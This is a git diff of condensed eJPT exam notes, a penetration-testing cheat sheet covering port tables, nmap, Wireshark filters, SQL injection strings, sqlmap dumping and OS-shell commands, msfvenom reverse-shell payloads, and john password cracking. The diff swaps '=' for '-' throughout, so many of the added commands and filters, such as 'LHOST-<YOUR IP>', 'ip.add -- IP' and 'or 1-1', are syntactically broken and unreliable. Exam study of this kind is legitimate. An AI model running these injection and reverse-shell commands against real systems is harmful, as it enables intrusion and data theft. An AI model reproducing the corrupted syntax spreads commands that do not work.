@@ -9,7 +9,7 @@ These are my condensed notes to help you on the eJPT exam.  The layout of this d
 ### TCP
 
 | **Port** | **Service** | 
-| ==== | ======= |
+| ---- | ------- |
 | 21 | FTP |
 | 22 | SSH |
 | 23 | Telnet |
@@ -24,7 +24,7 @@ These are my condensed notes to help you on the eJPT exam.  The layout of this d
 ### UDP
 
 | **Port** | **Service** | 
-| ==== | ======= |
+| ---- | ------- |
 | 53 | DNS |
 | 67 | DHCP |
 | 68 | DHCP |
@@ -34,7 +34,7 @@ These are my condensed notes to help you on the eJPT exam.  The layout of this d
 ## Other Useful Ports
 
 | **Port** | **Service** | 
-| ==== | ======= |
+| ---- | ------- |
 | 1433 | MS SQL Server |
 | 3389 | RDP |
 | 3306 | MySQL |
@@ -47,7 +47,7 @@ Use `ifconfig` to establish your IP.  For example:
 
 ```
 $ ifconfig
-tap0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+tap0: flags-4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 192.168.193.70  netmask 255.255.255.0  broadcast 0.0.0.0
         inet6 fe80::c8f:29ff:feb4:5219  prefixlen 64  scopeid 0x20<link>
         ether 0e:8f:29:b4:52:19  txqueuelen 1000  (Ethernet)
@@ -166,7 +166,7 @@ $ nmap -sV 10.11.12.0/24
 $ nmap -sT 192.168.12.33,34
 
 # Full scan (all ports, syn/script/version scan)
-$ nmap -Pn -T4 --open -sS -sC -sV --min-rate=1000 --max-retries=3 -p- -oN output_file 10.10.10.2
+$ nmap -Pn -T4 --open -sS -sC -sV --min-rate-1000 --max-retries-3 -p- -oN output_file 10.10.10.2
 ```
 
 ### Shares Enumeration
@@ -226,13 +226,13 @@ $ openssl s_client -connect <IP ADDRESS>:443
 ### Common Wireshark Filters
 
 | Description | Syntax | Example |
-| =========== | ====== | ======= |
-| Filter by IP | `ip.add == IP ADDRESS` | `ip.add == 192.168.1.28` |
-| Filter by Destination IP | `ip.dest == IP ADDRESS` | `ip.add == 192.168.1.28` |
-| Filter by Source IP | `ip.src == IP ADDRESS` | `ip.add == 192.168.1.72` |
-| Filter by Port | `tcp.port == PORT` | `tcp.port == 80` |
-| Filter by IP Address and Port | `ip.addr == IP ADDRESS and tcp.port == PORT` | `ip.addr == 10.9.0.1 and tcp.port == 80` | 
-| Filter by Request (HTTP/HTTPS) | `request.method == METHOD` | `request.method == "POST"` or `request.method == "GET"`
+| ----------- | ------ | ------- |
+| Filter by IP | `ip.add -- IP ADDRESS` | `ip.add -- 192.168.1.28` |
+| Filter by Destination IP | `ip.dest -- IP ADDRESS` | `ip.add -- 192.168.1.28` |
+| Filter by Source IP | `ip.src -- IP ADDRESS` | `ip.add -- 192.168.1.72` |
+| Filter by Port | `tcp.port -- PORT` | `tcp.port -- 80` |
+| Filter by IP Address and Port | `ip.addr -- IP ADDRESS and tcp.port -- PORT` | `ip.addr -- 10.9.0.1 and tcp.port -- 80` | 
+| Filter by Request (HTTP/HTTPS) | `request.method -- METHOD` | `request.method -- "POST"` or `request.method -- "GET"`
 
 ### Web Enumeration
 
@@ -336,9 +336,9 @@ This adds a route to the `192.168.1.0/24` network via the `10.10.22.1` router.
 #### Manual SQL Injection (SQLi)
 
 | Description | Injection |
-| =========== | ========= |
+| ----------- | --------- |
 | Basic union | `xx' UNION SELECT null; -- -` |
-| Basic bypass | `' or 1=1; -- -` |
+| Basic bypass | `' or 1-1; -- -` |
 
 #### Automated Exploitation with `sqlmap`
 
@@ -350,16 +350,16 @@ For example:
 
 ```
 # Display all tables in the database
-$ sqlmap -u http://10.10.0.1/index.php?id=47 --tables
+$ sqlmap -u http://10.10.0.1/index.php?id-47 --tables
 
 # Enumerate the id parameter using the union technique
-$ sqlmap -u 'http://192.168.1.72/index.php?id=10' -p id --technique=U
+$ sqlmap -u 'http://192.168.1.72/index.php?id-10' -p id --technique-U
 
 # Dump database contents
-$ sqlmap -u 'http://192.162.5.51/index.php?id=203' --dump
+$ sqlmap -u 'http://192.162.5.51/index.php?id-203' --dump
 
 # Prompt for interactive OS shell
-$ sqlmap -u 'http://192.168.1.17/index.php?id=1' -os-shell
+$ sqlmap -u 'http://192.168.1.17/index.php?id-1' -os-shell
 ```
 
 #### Cross-Site Scripting (XSS)
@@ -435,19 +435,19 @@ $ exploit
 Standard PHP reverse shell:
 
 ```
-$ msfvenom -p php/reverse_php LHOST=<YOUR IP> LPORT=<LISTENER PORT> -o <OUTPUT FILE NAME>
+$ msfvenom -p php/reverse_php LHOST-<YOUR IP> LPORT-<LISTENER PORT> -o <OUTPUT FILE NAME>
 ```
 
 Windows reverse shell:
 
 ```
-$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR IP> LPORT=<LISTENER PORT> -f dll > shell.dll
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST-<YOUR IP> LPORT-<LISTENER PORT> -f dll > shell.dll
 ```
 
 Linux reverse shell:
 
 ```
-$ msfvenom -p linux/x64/shell/reverse_tcp LHOST=<YOUR IP> LPORT=<LISTENER PORT> -f elf > shell.elf
+$ msfvenom -p linux/x64/shell/reverse_tcp LHOST-<YOUR IP> LPORT-<LISTENER PORT> -f elf > shell.elf
 ```
 
 #### Meterpreter Shell Commands
@@ -505,7 +505,7 @@ $ which python
 $ python -c "import pty; pty.spawn('/bin/bash')"
 
 # Finally, export XTERM (allows you to clear terminal)
-$ export TERM=xterm
+$ export TERM-xterm
 ```
 
 ## Bruteforcing
@@ -541,10 +541,10 @@ $ unshadow passwd shadow > hash
 Crack the passwords:
 
 ```
-$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+$ john --wordlist-/usr/share/wordlists/rockyou.txt hash
 ```
 
 ## Other cheatsheets:
 
-Hydra: https://github.com/frizb/Hydra-Cheatsheet
-GTFOBins: https://gtfobins.github.io/
+- Hydra: https://github.com/frizb/Hydra-Cheatsheet
+- GTFOBins: https://gtfobins.github.io/
